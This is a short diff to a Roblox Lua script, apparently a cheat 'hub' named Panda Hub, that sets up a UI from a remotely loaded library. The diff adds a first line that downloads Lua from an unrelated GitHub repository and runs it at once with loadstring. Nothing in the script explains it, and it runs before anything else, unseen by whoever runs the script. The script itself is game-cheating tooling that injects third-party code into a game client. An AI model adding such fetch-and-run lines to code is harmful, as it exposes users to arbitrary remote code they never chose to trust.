@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Mc4121ban/hahahah/main/myshitmontage"))()
 local NEVERLOSE = loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/NEVERLOSE-UI-Nightly/main/source.lua"))()
 NEVERLOSE:Theme("dark")
 local Window = NEVERLOSE:AddWindow("Panda Hub","Beta Tester")
